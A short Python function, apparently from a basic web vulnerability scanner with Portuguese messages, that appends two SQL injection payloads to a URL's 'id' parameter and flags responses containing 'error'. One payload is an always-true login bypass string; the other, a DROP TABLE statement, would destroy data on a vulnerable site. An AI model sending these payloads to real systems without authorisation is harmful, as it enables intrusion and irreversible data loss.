from .http_requests import fetch_url

def test_sqli(url):
    sqli_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
    for payload in sqli_payloads:
        full_url = f"{url}?id={payload}"
        resp = fetch_url(full_url)
        if resp and 'error' in resp.text.lower():
            print(f"Possível vulnerabilidade de SQLi encontrada em: {full_url}")
